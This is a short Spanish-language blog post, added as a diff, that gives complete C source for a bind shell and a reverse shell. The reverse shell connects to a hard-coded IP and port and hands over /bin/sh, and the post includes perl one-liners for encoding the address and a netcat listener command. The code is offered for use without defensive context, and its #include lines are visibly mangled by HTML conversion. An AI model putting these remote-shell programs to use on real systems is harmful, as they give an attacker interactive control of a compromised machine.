@@ -1,0 +1,84 @@
+﻿---
+layout: post
+title: "Shell remotos en c" 
+date: 2030-04-09 13:33:00 
+categories: coding
+---
+<p>
+	En linux usando sockets y la llamada dup se puede crear una especie de shell remoto de forma muy sencilla,</p>
+<p>
+	&nbsp;</p>
+<pre class="brush: js">
+#include <unistd.h>
+#include <sys socket.h="">
+#include <netinet in.h="">
+
+int main () {
+
+int sock,canal;
+struct sockaddr_in dir_servidor;
+
+dir_servidor.sin_family=2;
+dir_servidor.sin_addr.s_addr=0;
+dir_servidor.sin_port=0x1337;
+
+sock=socket(2,1,0);
+
+bind(sock,(struct sockaddr *) &amp;dir_servidor,0x10);
+
+listen(sock,1);
+
+canal = accept(sock,0,0);
+
+dup2(canal,0);
+dup2(canal,1);
+
+execve(&quot;/bin/sh&quot;,0,0);
+
+}
+
+</netinet></sys></unistd.h></pre>
+<p>
+	&nbsp;</p>
+<p>
+	Hacer un shell inverso tampoco es complicado, luego basta con usar netcat al otro lado.</p>
+<pre>
+/**
+* reverseshell.c
+* Shell inverso. Se conecta a un socket externo
+* y asocia a un shell local.
+* Para generar una IP en hexadecimal
+*   perl -e &#39;printf &quot;0x&quot; . &quot;%02x&quot;x4 . &quot;n&quot;,249,1,168,192&#39;
+* El puerto tb es un n&uacute;mero hexadecimal:
+*   perl -e &#39;printf &quot;0x&quot; . &quot;%04x&quot; . &quot;n&quot;,14099&#39;
+*   darle la vuelta al resultado por pares: 0x3713 pasar a 0x1337
+* Para compilar:
+* gcc -o reverseshell reverseshell.c
+* Para comprobar:
+* nc -l -p  14099
+*/
+
+#include <unistd.h>
+#include <sys socket.h="">
+#include <netinet in.h="">
+
+int main () {
+
+int canal;
+struct sockaddr_in dir_servidor;
+
+dir_servidor.sin_family=2;
+dir_servidor.sin_addr.s_addr=0xf901a8c0;
+dir_servidor.sin_port=0x1337;
+
+canal=socket(2,1,6);
+
+connect(canal,(struct sockaddr *) &amp;dir_servidor,0x10);
+
+dup2(canal,0);
+dup2(canal,1);
+
+execve(&quot;/bin/sh&quot;,0,0);
+
+}
+</netinet></sys></unistd.h></pre>
